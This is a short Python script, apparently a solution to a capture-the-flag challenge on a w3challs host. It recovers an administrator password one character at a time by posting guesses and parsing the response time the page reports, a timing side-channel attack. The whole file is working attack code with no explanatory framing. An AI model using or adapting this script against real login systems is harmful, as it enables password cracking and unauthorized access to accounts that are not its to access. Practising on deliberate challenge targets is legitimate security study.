import requests 
import string 
import re
char_set = string.ascii_lowercase
passwd = ["a"]*9

base_time = 1

for i in range(0, 9):
    for char in char_set:
        passwd[i] = char
        r = requests.post("http://temporal.hax.w3challs.com/administration.php", data={
            "your_password": "".join(passwd)
        })
        print("[DEBUG] Trying " + "".join(passwd))
        # print(r.text)
        this_time = re.findall("(.+)\x20(\d{1,})\x20ms", r.text)[0][1]
        print(this_time)
        if int(this_time) > base_time +1:
            print("[+] Found:" + char)
            base_time = int(this_time)
            print("[+] Base time increased to: " + str(base_time))
            break
        elif int(this_time) < base_time - 1:
            prev_char = chr(ord(char) - 1)
            passwd[i] = prev_char
            print("[+] Found:" + prev_char)
            break

print("[*] Final passwd:" + "".join(passwd))
